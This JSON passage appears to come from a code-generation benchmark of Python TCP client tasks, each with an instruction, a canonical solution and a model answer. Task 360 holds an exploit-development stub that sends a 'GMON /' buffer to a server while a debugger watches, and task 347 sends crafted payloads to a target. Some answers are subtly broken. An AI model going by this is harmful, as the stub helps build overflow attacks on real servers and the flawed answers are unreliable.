dest_terminal_id=dest,\n            service_id=self.service_id\n        )\n        self.send(submit_request)\n        header, body = self.recv()\n        command_id = header.get('command_id')\n        if command_id == CMPP_DELIVER:\n            deliver_request = CMPPDeliverRespRequestInstance(\n                msg_id=body['Msg_Id'], result=body['Result']\n            )\n            self.send(deliver_request)\n\n    def send_sms(self, dest: List[str], sign_name: str, template_code: str, template_param: Dict) -> None:\n        try:\n            self._cmpp_connect()\n            self._cmpp_send_sms(dest, sign_name, template_code, template_param)\n        except Exception as e:\n            self.close()\n            raise Exception(e)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport time\nfrom typing import Union, List, Dict\n\nclass CMPPClient:\n    def __init__(self, host: str, port: int, sp_id: str, sp_secret: str, src_id: str, service_id: str) -> None:\n        self.ip = host\n        self.port = port\n        self.sp_id = sp_id\n        self.sp_secret = sp_secret\n        self.src_id = src_id\n        self.service_id = service_id\n        self._sequence_id = 0\n        self._is_connect = False\n        self._times = 0\n        self.__socket = None\n\n    @property\n    def sequence_id(self) -> int:\n        self._sequence_id += 1\n        return self._sequence_id\n\n    def _connect(self) -> None:\n        self._times = 0\n        while not self._is_connect:\n            try:\n                self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                self.__socket.connect((self.ip, self.port))\n                self._is_connect = True\n            except Exception as e:\n                self._times += 1\n                if self._times > 5:\n                    raise\n                time.sleep(1)\n\n    def send(self, instance: Union[CMPPBaseRequestInstance, bytes]) -> None:\n        if isinstance(instance, CMPPBaseRequestInstance):\n            data = instance.pack()\n        else:\n            data = instance\n        self.__socket.sendall(data)\n\n    def recv(self) -> tuple:\n        data = self.__socket.recv(1024)\n        return data\n\n    def close(self) -> None:\n        self.__socket.close()\n        self._is_connect = False\n\n    def _cmpp_connect(self) -> None:\n        pass\n\n    def _cmpp_send_sms(self, dest: List[str], sign_name: str, template_code: str, template_param: Dict) -> None:\n        pass\n\n    def send_sms(self, dest: List[str], sign_name: str, template_code: str, template_param: Dict) -> None:\n        try:\n            self._cmpp_send_sms(dest, sign_name, template_code, template_param)\n        except Exception as e:\n            print(f\"Error sending SMS: {e}\")"
  },
  {
    "Task_id": 346,
    "Instruction": "Task Description: Implement a TCP client class for handling XDCC file downloads with progress tracking, speed calculation, and resumable download capabilities.\n\nClass Description: XDCCRequest is a class that manages file downloads over DCC (Direct Client-to-Client) protocol using TCP sockets. It provides functionality for establishing connections, downloading files with progress tracking, handling resumable downloads, and managing download speed calculations.\n\nAttributes:\n- proxies: dict - Proxy configuration for the connection\n- bucket: object - Rate limiting bucket for download speed control\n- fh: file object - File handle for writing downloaded data\n- dccsock: socket - TCP socket for DCC connection\n- filesize: int - Total size of the file being downloaded\n- received: int - Number of bytes received so far\n- speeds: list - List of recent download speeds (last three measurements)\n- sleep: float - Dynamic sleep interval for rate control\n- last_recv_size: int - Size of last received data chunk\n- send_64bits_ack: bool - Flag for using 64-bit ACK packets\n- abort: bool - Flag to indicate download abortion\n- status_notify: function - Callback for progress updates\n\nMethods:\n- create_socket() -> socket - Creates and returns a new TCP socket\n- _write_func(buf: bytes) -> None - Writes buffer to file with rate control\n- _send_ack() -> None - Sends acknowledgement of received bytes to server\n- download(ip: str, port: int, filename: str, status_notify: function=None, resume: function=None) -> str - Main download method\n- abort_downloads() -> None - Sets abort flag to stop current download\n- update_progress() -> None - Triggers progress notification callback\n- close() -> None - Cleanup method (currently empty)\n\nProperties:\n- size: int - Returns total file size\n- arrived: int - Returns bytes received so far\n- speed: int - Returns average download speed\n- percent: int - Returns download progress percentage",
    "Canonical_solution": "import errno\nimport os\nimport select\nimport socket\nimport struct\nimport time\n\nclass XDCCRequest:\n    def __init__(self, bucket=None, options={}):\n        self.proxies = options.get(\"proxies\", {})\n        self.bucket = bucket\n        self.fh = None\n        self.dccsock = None\n        self.filesize = 0\n        self.received = 0\n        self.speeds = [0, 0, 0]\n        self.sleep = 0.000\n        self.last_recv_size = 0\n        self.send_64bits_ack = False\n        self.abort = False\n        self.status_notify = None\n\n    def create_socket(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        return sock\n\n    def _write_func(self, buf):\n        size = len(buf)\n        self.received += size\n        self.fh.write(buf)\n\n        if self.bucket:\n            time.sleep(self.bucket.consumed(size))\n        else:\n            if size < self.last_recv_size:\n                self.sleep += 0.002\n            else:\n                self.sleep *= 0.7\n            self.last_recv_size = size\n            time.sleep(self.sleep)\n\n    def _send_ack(self):\n        try:\n            self.dccsock.send(\n                struct.pack(\"!Q\" if self.send_64bits_ack else \"!I\", self.received)\n            )\n        except socket.error:\n            pass\n\n    def download(self, ip, port, filename, status_notify=None, resume=None):\n        self.status_notify = status_notify\n        self.send_64bits_ack = not self.filesize < 1 << 32\n        chunk_name = filename + \".chunk0\"\n\n        if resume and os.path.exists(chunk_name):\n            self.fh = open(chunk_name, mode=\"ab\")\n            resume_position = self.fh.tell()\n            if not resume_position:\n                resume_position = os.stat(chunk_name).st_size\n            resume_position = resume(resume_position)\n            self.fh.truncate(resume_position)\n            self.received = resume_position\n        else:\n            self.fh = open(chunk_name, mode=\"wb\")\n\n        last_update = time.time()\n        num_recv_len = 0\n        self.dccsock = self.create_socket()\n        recv_list = [self.dccsock]\n        self.dccsock.connect((ip, port))\n        self.dccsock.setblocking(False)\n\n        while True:\n            if self.abort:\n                self.dccsock.close()\n                self.fh.close()\n                raise Abort\n\n            fdset = select.select(recv_list, [], [], 0.1)\n            if self.dccsock in fdset[0]:\n                try:\n                    data = self.dccsock.recv(16384)\n                except socket.error as exc:\n                    if exc.errno in (errno.EAGAIN, errno.EWOULDBLOCK):\n                        continue\n                    else:\n                        raise\n\n                data_len = len(data)\n                if data_len == 0 or self.received + data_len > self.filesize > 0:\n                    break\n\n                num_recv_len += data_len\n                self._write_func(data)\n                self._send_ack()\n\n            now = time.time()\n            timespan = now - last_update\n            if timespan > 1:\n                self.speeds[2] = self.speeds[1]\n                self.speeds[1] = self.speeds[0]\n                self.speeds[0] = num_recv_len // timespan\n                num_recv_len = 0\n                last_update = now\n                self.update_progress()\n\n        self.dccsock.close()\n        self.fh.close()\n        os.rename(chunk_name, filename)\n        return filename\n\n    def abort_downloads(self):\n        self.abort = True\n\n    def update_progress(self):\n        if self.status_notify:\n            self.status_notify({\"progress\": self.percent})\n\n    @property\n    def size(self):\n        return self.filesize\n\n    @property\n    def arrived(self):\n        return self.received\n\n    @property\n    def speed(self):\n        speeds = [x for x in self.speeds if x]\n        return sum(speeds) // len(speeds)\n\n    @property\n    def percent(self):\n        if not self.filesize:\n            return 0\n        return (self.received * 100) // self.filesize\n\n    def close(self):\n        pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport time\nimport math\n\nclass XDCCRequest:\n    def __init__(self, proxies=None):\n        self.proxies = proxies or {}\n        self.bucket = None\n        self.fh = None\n        self.dccsock = None\n        self.filesize = 0\n        self.received = 0\n        self.speeds = []\n        self.sleep = 0.0\n        self.last_recv_size = 0\n        self.send_64bits_ack = False\n        self.abort = False\n        self.status_notify = None\n\n    def create_socket(self):\n        if self.proxies:\n            proxy_host = self.proxies.get('host')\n            proxy_port = self.proxies.get('port')\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            sock.connect((proxy_host, proxy_port))\n            return sock\n        else:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            return sock\n\n    def _write_func(self, buf):\n        if self.abort:\n            return\n        if not self.fh:\n            return\n        if self.bucket:\n            self.bucket.consume(len(buf))\n        self.fh.write(buf)\n        self.received += len(buf)\n        if self.status_notify:\n            self.status_notify(self.received, self.filesize)\n\n    def _send_ack(self):\n        if self.send_64bits_ack:\n            ack = (self.received).to_bytes(8, 'big')\n        else:\n            ack = (self.received).to_bytes(4, 'big')\n        self.dccsock.sendall(ack)\n\n    def download(self, ip, port, filename, status_notify=None, resume=None):\n        self.status_notify = status_notify\n        self.filesize = 0\n        self.received = 0\n        self.speeds = []\n        self.abort = False\n        self.dccsock = self.create_socket()\n        try:\n            self.dccsock.connect((ip, port))\n            self.dccsock.settimeout(60)\n            self.dccsock.sendall(b'GET ' + filename.encode() + b'\\r\\n')\n            while True:\n                data = self.dccsock.recv(65535)\n                if not data:\n                    break\n                self._write_func(data)\n                self._send_ack()\n                self.update_progress()\n        except Exception as e:\n            print(f\"Download failed: {e}\")\n        finally:\n            self.close()\n        return filename\n\n    def abort_downloads(self):\n        self.abort = True\n\n    def update_progress(self):\n        if self.filesize == 0:\n            return\n        percent = int((self.received / self.filesize) * 100)\n        if self.status_notify:\n            self.status_notify(percent, self.filesize, self.received)\n\n    def close(self):\n        if self.dccsock:\n            self.dccsock.close()\n        if self.fh:\n            self.fh.close()"
  },
  {
    "Task_id": 347,
    "Instruction": "Task Description: Create a Python function that sends a TCP payload to a specified server using socket programming.\n\nFunction Description: The function establishes a TCP connection to a target server, constructs an HTTP GET request with the provided payload, sends the request, and then closes the connection. This is useful for testing server responses or sending crafted HTTP requests.\n\nInput:\n- target_ip: [str] - The IP address of the target server\n- target_port: [int] - The port number of the target server\n- payload: [str] - The data to be included in the HTTP GET request path\n\nOutput: None (The function sends data but does not return any value)",
    "Canonical_solution": "import socket\n\ndef send_tcp_payload(target_ip, target_port, payload):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target_ip, target_port))\n    \n    buf = (\n        \"GET /\" + payload + \" HTTP/1.1\\r\\n\" + \n        \"Host: \" + target_ip + \n        \"\\r\\n\\r\\n\"\n    )\n    \n    s.send(buf)\n    s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "def send_tcp_payload(target_ip, target_port, payload):\n    import socket\n\n    try:\n        # Create a TCP socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(5)  # Set a timeout for the connection attempt\n\n        # Construct the HTTP GET request\n        http_request = f\"GET /{payload} HTTP/1.1\\r\\nHost: {target_ip}\\r\\nConnection: close\\r\\n\\r\\n\"\n\n        # Connect to the server\n        sock.connect((target_ip, target_port))\n\n        # Send the HTTP request\n        sock.sendall(http_request.encode('utf-8'))\n\n        # Close the connection\n        sock.close()\n\n    except Exception as e:\n        print(f\"An error occurred: {e}\")"
  },
  {
    "Task_id": 348,
    "Instruction": "Task Description: Implement a secure TCP client using SSL/TLS for encrypted communication with a server. The client should establish a secure connection, send data, receive responses, and properly close the connection.\n\nFunction Description: The code consists of two functions:\n1. `ssl_client_connect` - Creates and returns an SSL-wrapped socket connected to the specified host and port, with certificate verification\n2. `ssl_client_communicate` - Sends a message through the secure socket, receives the response, and closes the connection\n\nInput:\n- For `ssl_client_connect`:\n  - host: str - The target server's hostname or IP address\n  - port: int - The target server's port number\n  - cert_file: str - Path to the CA certificate file for server verification\n\n- For `ssl_client_communicate`:\n  - ssl_socket: ssl.SSLSocket - The established SSL socket connection\n  - message: bytes - The data to send to the server\n\nOutput:\n- For `ssl_client_connect`: Returns an established SSL socket connection (ssl.SSLSocket)\n- For `ssl_client_communicate`: Returns the server's response as bytes",
    "Canonical_solution": "from socket import socket, AF_INET, SOCK_STREAM\nimport ssl\n\ndef ssl_client_connect(host, port, cert_file):\n    s = socket(AF_INET, SOCK_STREAM)\n    ssl_s = ssl.wrap_socket(s,\n                           cert_reqs=ssl.CERT_REQUIRED,\n                           ca_certs=cert_file)\n    ssl_s.connect((host, port))\n    return ssl_s\n\ndef ssl_client_communicate(ssl_socket, message):\n    ssl_socket.send(message)\n    resp = ssl_socket.recv(8192)\n    ssl_socket.close()\n    return resp",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import ssl\nimport socket\n\ndef ssl_client_connect(host, port, cert_file):\n    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n    context.load_verify_locations(cafile=cert_file)\n    context.verify_mode = ssl.CERT_REQUIRED\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    ssl_sock = context.wrap_socket(sock, server_hostname=host)\n    ssl_sock.connect((host, port))\n    return ssl_sock\n\ndef ssl_client_communicate(ssl_socket, message):\n    ssl_socket.sendall(message)\n    response = b''\n    while True:\n        data = ssl_socket.recv(4096)\n        if not data:\n            break\n        response += data\n    ssl_socket.close()\n    return response"
  },
  {
    "Task_id": 351,
    "Instruction": "Task Description: Create a TCP client class in Python that establishes a connection to a server, sends data with length prefixing, and properly closes the connection.\n\nClass Description: BaseSocketClient is a TCP client implementation that handles socket creation, connection management, and data transmission with length-prefixed messages. It supports both simple and detected encoding modes for data transmission.\n\nAttributes:\n- s: [socket.socket] - The underlying TCP socket object used for communication\n\nMethods:\n- __init__(host: str, port: int) -> None - Initializes the client and establishes a connection to the specified host and port. If host is 'auto', uses the local hostname.\n- send(data: Any) -> None - Sends data to the server after encoding detection, prefixing the message with its length in bytes.\n- send_smpl(data: Any) -> None - Sends data to the server using simple encoding, prefixing the message with its length in bytes.\n- close() -> None - Closes the connection with the server.",
    "Canonical_solution": "import socket\n\nclass BaseSocketClient:\n    def __init__(self, host, port) -> None:\n        if host == 'auto':\n            host = socket.gethostname()\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        self.s = s\n    \n    def send(self, data):\n        val = encode_detect(data)\n        self.s.send(bytes('{}\\n'.format(len(val)), 'ascii'))\n        self.s.sendall(val)\n    \n    def send_smpl(self, data):\n        val = encode_smpl(data)\n        self.s.send(bytes('{}\\n'.format(len(val)), 'ascii'))\n        self.s.sendall(val)\n    \n    def close(self):\n        self.s.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport struct\n\nclass BaseSocketClient:\n    def __init__(self, host: str, port: int) -> None:\n        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        if host == 'auto':\n            self.s.connect((socket.gethostname(), port))\n        else:\n            self.s.connect((host, port))\n\n    def send(self, data: any) -> None:\n        encoded_data = self._detect_encoding(data)\n        self._send(encoded_data)\n\n    def send_smpl(self, data: any) -> None:\n        encoded_data = self._encode_simple(data)\n        self._send(encoded_data)\n\n    def _detect_encoding(self, data: any) -> bytes:\n        if isinstance(data, str):\n            return data.encode('utf-8')\n        return data\n\n    def _encode_simple(self, data: any) -> bytes:\n        return str(data).encode('utf-8')\n\n    def _send(self, data: bytes) -> None:\n        length = struct.pack('!I', len(data))\n        self.s.sendall(length + data)\n\n    def close(self) -> None:\n        self.s.close()"
  },
  {
    "Task_id": 353,
    "Instruction": "Task Description: Implement a TCP client function in Python that communicates with a server using sockets. The function should establish a connection, send a message, receive a response, and close the connection.\n\nFunction Description: The function `tcp_client_communication` creates a TCP socket, connects to a specified server, sends a message, receives a response, and then closes the connection. It uses IPv4 for the socket connection.\n\nInput:\n- `host` (str, optional): The IP address or hostname of the server. Defaults to 'localhost'.\n- `port` (int, optional): The port number on which the server is listening. Defaults to 16000.\n- `message` (bytes, optional): The message to be sent to the server. Defaults to b'Hello\\n'.\n\nOutput:\n- `response` (bytes): The data received from the server as a response.",
    "Canonical_solution": "from socket import socket, AF_INET, SOCK_STREAM\n\ndef tcp_client_communication(host='localhost', port=16000, message=b'Hello\\n'):\n    s = socket(AF_INET, SOCK_STREAM)\n    s.connect((host, port))\n    s.send(message)\n    response = s.recv(8192)\n    s.close()\n    return response",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "def tcp_client_communication(host='localhost', port=16000, message=b'Hello\\n'):\n    import socket\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    client_socket.connect((host, port))\n    client_socket.sendall(message)\n    response = client_socket.recv(1024)\n    client_socket.close()\n    return response"
  },
  {
    "Task_id": 355,
    "Instruction": "Task Description: Implement a TCP client for Remote Console (RCon) protocol communication, which allows sending commands to a game server and receiving responses. The implementation should handle connection establishment, command sending, response receiving, and error handling.\n\nClass Description: RConConnection is a class that manages the connection to an RCon server, handles authentication, and provides methods to send commands and receive responses. It includes error handling for various RCon protocol scenarios.\n\nAttributes:\n- sock: [socket.socket] - The TCP socket object used for communication with the RCon server\n- rid: [int] - The current request ID used for tracking requests and responses\n\nMethods:\n- __init__(target: str, port: int) -> None - Initializes the RCon connection by creating a TCP socket and connecting to the specified target and port\n- send(t: int, payload: str) -> bytes - Sends an RCon packet with the specified type and payload, waits for and returns the response data\n- login(password: str) -> None - Authenticates with the RCon server using the provided password (uses send with type 3)\n- command(com: str, args: str) -> None - Sends a command to the RCon server (uses send with type 2)\n- close() -> None - Closes the connection to the RCon server",
    "Canonical_solution": "import socket\nimport struct\nimport select\n\nclass RConException(Exception):\n    def __init__(self, request_id, reason):\n        self.request_id = request_id\n        self.reason = reason\n\n    def __str__(self):\n        return (\"Failed RCon request with request ID %d, reason %s\" %\n                (self.request_id, self.reason))\n\nclass RConConnection:\n    def __init__(self, target, port):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect((target, port))\n        self.rid = 0\n\n    def send(self, t, payload):\n        self.rid = self.rid + 1\n        pld_enc = payload.encode(\"utf-8\")\n        header = struct.pack(\"<iii\",\n                             len(pld_enc) + 4 + 4 + 2,  # rid, type and padding\n                             self.rid, t)\n        data = header + pld_enc + b'\\x00\\x00'\n        self.sock.send(data)\n\n        toread = select.select([self.sock], [], [], 30)\n\n        if not toread:\n            raise RConException(self.rid, \"Request timed out.\")\n\n        try:\n            res_len, res_id, res_type = \\\n                struct.unpack(\"<iii\", self.sock.recv(12, socket.MSG_WAITALL))\n            if res_len < 0:\n                raise Exception(\"Response length is {}.\".format(res_len))\n\n        except Exception as e:\n            raise RConException(self.rid,\n                                \"RCon protocol error. Are you sure you're \"\n                                \"talking to the RCon port? Error: %s\" % e)\n        res_data = self.sock.recv(res_len - 4 - 4)\n        res_data = res_data[:-2]\n\n        if res_id == -1:\n            if t == 3:\n                raise RConException(self.rid, \"Login failed.\")\n            else:\n                raise RConException(self.rid,\n                                    \"Request failed due to invalid login.\")\n        elif res_id != self.rid:\n            raise RConException(self.rid, \"Received unexpected response \"\n                                \"number: %d\" % res_id)\n        return res_data\n\n    def login(self, password):\n        self.send(3, password)\n\n    def command(self, com, args):\n        self.send(2, com + \" \" + args)\n\n    def close(self):\n        self.sock.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\nclass RConConnection:\n    def __init__(self, target: str, port: int) -> None:\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect((target, port))\n        self.rid = 0\n\n    def send(self, t: int, payload: str) -> bytes:\n        self.rid += 1\n        packet = f\"{self.rid}{t}{len(payload)}{payload}\\n\"\n        self.sock.sendall(packet.encode())\n        response = self.sock.recv(4096)\n        return response\n\n    def login(self, password: str) -> None:\n        self.send(3, password)\n\n    def command(self, com: str, args: str) -> None:\n        self.send(2, f\"{com} {args}\")\n\n    def close(self) -> None:\n        self.sock.close()"
  },
  {
    "Task_id": 356,
    "Instruction": "Task Description: Implement a TCP client class that communicates with a server to validate sessions using JSON-RPC protocol, handling connection management, data transmission, and response validation.\n\nClass Description: CaseTCP is a TCP client class that establishes and maintains a connection to a server, sends session validation requests in JSON-RPC format, and processes the server's responses with proper error handling and assertion checks.\n\nAttributes:\n- identity: int - A unique identifier for the client (defaults to process ID)\n- expected: bool - The expected validation result from the server\n- uri: str - The server IP address (default: '127.0.0.1')\n- port: int - The server port number (default: 8545)\n- sock: socket.socket - The TCP socket object for communication\n- payload: str - A random string payload for session validation\n\nMethods:\n- __init__(uri: str = '127.0.0.1', port: int = 8545, identity: int = os.getpid()) -> None - Initializes the client with server connection details and generates a random payload\n- __call__(**kwargs) -> int - Makes a combined send and receive call (takes optional a and b parameters)\n- send(*, a: Optional[int] = None, b: Optional[int] = None) -> int - Sends a session validation request to the server with optional parameters (generates random values if not provided)\n- recv() -> int - Receives and validates the server response, returning the validation result",
    "Canonical_solution": "import os\nimport json\nimport errno\nimport socket\nfrom typing import Optional\n\ndef make_tcp_socket(ip: str, port: int):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    return sock\n\ndef socket_is_closed(sock: socket.socket) -> bool:\n    if sock is None:\n        return True\n    try:\n        buf = sock.recv(1, socket.MSG_PEEK | socket.MSG_DONTWAIT)\n        if buf == b'':\n            return True\n    except BlockingIOError as exc:\n        if exc.errno != errno.EAGAIN:\n            raise\n    return False\n\ndef recvall(sock, buffer_size=4096):\n    data = b\"\"\n    while True:\n        chunk = sock.recv(buffer_size)\n        if not chunk:\n            break\n        data += chunk\n    return data\n\nclass CaseTCP:\n    def __init__(self, uri: str = '127.0.0.1', port: int = 8545, identity: int = os.getpid()) -> None:\n        self.identity = identity\n        self.expected = -1\n        self.uri = uri\n        self.port = port\n        self.sock = None\n        self.payload = ''.join(random.choices(string.ascii_uppercase, k=80))\n\n    def __call__(self, **kwargs) -> int:\n        self.send(**kwargs)\n        return self.recv()\n\n    def send(self, *, a: Optional[int] = None, b: Optional[int] = None) -> int:\n        a = random.randint(1, 1000) if a is None else a\n        b = random.randint(1, 1000) if b is None else b\n        jsonrpc = '{\"jsonrpc\":\"2.0\",\"id\":%i,\"method\":\"validate_session\",\"params\":{\"user_id\":%i,\"session_id\":%i,\"text\":\"%s\"}}' % (self.identity, a, b, self.payload)\n        self.expected = (a ^ b) % 23 == 0\n        self.sock = make_tcp_socket(self.uri, self.port) if socket_is_closed(self.sock) else self.sock\n        self.sock.send(jsonrpc.encode())\n\n    def recv(self) -> int:\n        response_bytes = recvall(self.sock).decode()\n        self.sock.settimeout(None)\n        response = json.loads(response_bytes)\n        assert 'error' not in response, response['error']\n        received = response['result']\n        assert response['jsonrpc']\n        assert response.get('id', None) == self.identity\n        assert self.expected == received, 'Wrong Answer'\n        return received",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport os\nimport random\nimport json\n\nclass CaseTCP:\n    def __init__(self, uri: str = '127.0.0.1', port: int = 8545, identity: int = os.getpid()) -> None:\n        self.identity = identity\n        self.expected = False\n        self.uri = uri\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.payload = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))\n\n    def __call__(self, **kwargs) -> int:\n        return self.send(**kwargs) if 'a' in kwargs or 'b' in kwargs else self.recv()\n\n    def send(self, *, a: Optional[int] = None, b: Optional[int] = None) -> int:\n        if a is None:\n            a = random.randint(1, 100)\n        if b is None:\n            b = random.randint(1, 100)\n        request = {\n            \"jsonrpc\": \"2.0\",\n            \"method\": \"session.validate\",\n            \"params\": {\n                \"identity\": self.identity,\n                \"payload\": self.payload,\n                \"a\": a,\n                \"b\": b\n            },\n            \"id\": self.identity\n        }\n        self.sock.connect((self.uri, self.port))\n        self.sock.sendall(json.dumps(request).encode('utf-8'))\n        return a + b\n\n    def recv(self) -> int:\n        self.sock.settimeout(5)\n        try:\n            response = self.sock.recv(4096).decode('utf-8')\n            self.sock.close()\n            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.sock.connect((self.uri, self.port))\n            data = json.loads(response)\n            if 'result' in data:\n                self.expected = data['result']\n                return self.expected\n            elif 'error' in data:\n                self.expected = False\n                return 0\n            else:\n                self.expected = False\n                return 0\n        except Exception as e:\n            self.expected = False\n            return 0"
  },
  {
    "Task_id": 357,
    "Instruction": "Task Description: Create a Python function that tests TCP connectivity to a target server through a SOCKS5 proxy, sends an HTTP request, and measures the response time.\n\nFunction Description: The function establishes a TCP connection to a specified target server through a SOCKS5 proxy, sends a basic HTTP GET request, verifies the response, and measures the time taken for the entire operation. The function handles connection setup, data transmission, response validation, and cleanup.\n\nInput: None (The target server address 'TARGET' is defined as a module-level constant)\n\nOutput: None (The function prints diagnostic messages and timing information to stdout)",
    "Canonical_solution": "import socket\nimport socks\nimport time\n\nTARGET = \"1.1.1.1\"\n\ndef test_tcp() -> None:\n    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)\n    s.set_proxy(socks.SOCKS5, \"127.0.0.1\", 1080)\n\n    print(f\"TCP - Sending HTTP request to {TARGET}\")\n    start = time.time()\n    s.connect((TARGET, 80))\n    s.send(b\"GET / HTTP/1.1\\r\\nHost: \" + TARGET.encode() + b\"\\r\\n\\r\\n\")\n    data = s.recv(1024)\n    if not data:\n        print(\"No data received\")\n    elif not data.startswith(b\"HTTP/1.1 \"):\n        print(\"Invalid response received\")\n    else:\n        print(\"TCP test passed\")\n    end = time.time()\n    s.close()\n\n    print(f\"Time: {round((end - start) * 1000, 2)} ms\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport socks\nimport socket\nimport time\nimport logging\n\nTARGET = 'example.com'\n\ndef test_tcp_through_socks5():\n    logging.basicConfig(level=logging.INFO)\n    proxy_host = '127.0.0.1'\n    proxy_port = 9150\n    target_host = TARGET\n    target_port = 80\n\n    try:\n        # Set up SOCKS5 proxy\n        socks.set_default_proxy(socks.SOCKS5, proxy_host, proxy_port)\n        socket.socket = socks.socksocket\n\n        # Create TCP connection to target server\n        start_time = time.time()\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((target_host, target_port))\n        end_time = time.time()\n        elapsed_time = end_time - start_time\n\n        # Send HTTP GET request\n        request = f\"GET / HTTP/1.1\\r\\nHost: {target_host}\\r\\nConnection: close\\r\\n\\r\\n\"\n        sock.sendall(request.encode())\n\n        # Receive response\n        response = b''\n        while True:\n            data = sock.recv(4096)\n            if not data:\n                break\n            response += data\n\n        # Validate response\n        if response.startswith(b'HTTP/1.1 200 OK'):\n            logging.info(\"Successfully connected through SOCKS5 proxy and received HTTP 200 OK\")\n        else:\n            logging.warning(f\"Received unexpected response: {response[:100]}...\")\n\n        # Print timing information\n        logging.info(f\"Total elapsed time: {elapsed_time:.4f} seconds\")\n\n    except Exception as e:\n        logging.error(f\"An error occurred: {e}\")\n\n    finally:\n        if 'sock' in locals() and sock is not None:\n            sock.close()"
  },
  {
    "Task_id": 358,
    "Instruction": "Task Description: Create a Python function that establishes a TCP client connection to a server, sends a JSON-formatted command with arguments, receives the server's response, and then closes the connection.\n\nFunction Description: The function `connect_client` creates a TCP socket, connects to a specified server, sends a command with arguments in JSON format, waits for and prints the server's response, and finally closes the socket connection.\n\nInput:\n- `machine` (str): The IP address or hostname of the target server.\n- `port` (int): The port number on which the server is listening.\n- `blendpath` (str): A file path or identifier to be included in the command arguments.\n- `obj_num` (int): A numerical argument to be included in the command arguments.\n\nOutput:\n- The function does not return any value but prints the server's response to the console.",
    "Canonical_solution": "import socket, json\n\ndef connect_client(machine, port, blendpath, obj_num):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((machine, port))\n    args = [blendpath, obj_num]\n    command = json.dumps({'call':1, 'command':1, 'args':args})\n    sock.send((command).encode())\n    response_data = sock.recv(1024)\n    print(response_data.decode())\n    sock.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import json\nimport socket\n\ndef connect_client(machine, port, blendpath, obj_num):\n    # Create a TCP socket\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    \n    # Connect to the server\n    client_socket.connect((machine, port))\n    \n    # Prepare the command with arguments in JSON format\n    command = {\n        \"command\": \"process_blend\",\n        \"blendpath\": blendpath,\n        \"obj_num\": obj_num\n    }\n    \n    # Send the JSON-formatted command\n    client_socket.send(json.dumps(command).encode('utf-8'))\n    \n    # Receive the server's response\n    response = client_socket.recv(1024).decode('utf-8')\n    \n    # Print the server's response\n    print(response)\n    \n    # Close the connection\n    client_socket.close()"
  },
  {
    "Task_id": 360,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a server, receives initial data from the server, sends a buffer with a specific prefix, and handles connection errors gracefully.\n\nFunction Description: The function `send_buffer_to_server` creates a TCP socket, connects to a specified server, receives initial data, sends a buffer prefixed with \"GMON /\", and ensures proper connection closure. It includes error handling for connection issues.\n\nInput:\n- host: [str] - The IP address or hostname of the target server\n- port: [int] - The port number on which the server is listening\n- buffer: [str] - The data buffer to be sent to the server (will be prefixed with \"GMON /\")\n\nOutput:\n- None (prints status messages to console: received data, error notifications, and confirmation of buffer sending)",
    "Canonical_solution": "import socket\n\ndef send_buffer_to_server(host, port, buffer):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        print \"\\n\" + data\n        s.send(\"GMON /\" + buffer + '\\r\\n')\n    except:\n        print \"Check your debugger\"\n    finally:\n        s.close()\n        print \"Buffer Sent!\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
